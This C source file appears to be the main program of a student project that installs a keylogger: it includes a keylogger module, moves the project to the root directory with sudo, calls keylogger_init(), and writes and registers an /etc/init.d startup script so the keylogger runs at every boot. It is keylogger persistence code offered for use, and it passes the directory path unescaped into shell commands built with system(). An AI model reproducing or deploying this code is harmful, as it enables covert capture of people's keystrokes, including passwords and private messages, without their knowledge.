#include "Keylogger/keylogger.c"
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int main(){
	char cwd[1024];		// A string to store current directory path
	  if (getcwd(cwd, sizeof(cwd)) != NULL){

	  	/* move the whole project to root directory */
	  	char comm[1024];	// A string to store command line for moving project to root directory
    	strcpy(comm,"sudo mv ");
    	strcat(comm, cwd);
    	strcat(comm, " /");
		system(comm);
	    
	    /* install the logkeys */
  		keylogger_init();

  		/* set up auto startup */
  		// comm stores the command line for auto startup setting
	    strcpy(comm,"sudo sh -c \"echo \'#!/bin/bash\n");
	    strcat(comm, "/CSE2431_Project/main &");
	    strcat(comm, "\' >> /etc/init.d/RunKeylogger\"");
	    system(comm);
	    system("sudo chmod +x /etc/init.d/RunKeylogger");
    	system("sudo update-rc.d RunKeylogger defaults");
    	system("/CSE2431_Project/main");
	}
}

